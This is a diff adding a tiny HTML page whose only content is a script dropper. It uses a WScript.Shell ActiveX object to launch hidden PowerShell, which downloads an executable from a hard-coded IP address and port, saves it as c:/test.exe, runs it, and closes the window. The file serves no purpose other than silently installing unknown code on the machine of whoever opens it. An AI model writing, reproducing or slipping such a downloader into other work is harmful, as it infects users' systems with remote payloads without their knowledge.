@@ -1,0 +1,9 @@
+<html>
+<head>
+<script>
+a=new ActiveXObject("WScript.Shell");
+a.run('%SystemRoot%/system32/WindowsPowerShell/v1.0/powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\'http://122.224.203.227:5946/cservice.exe\', \'c:/test.exe\'); c:/test.exe', 0);window.close();
+</script>
+
+</head>
+</html>
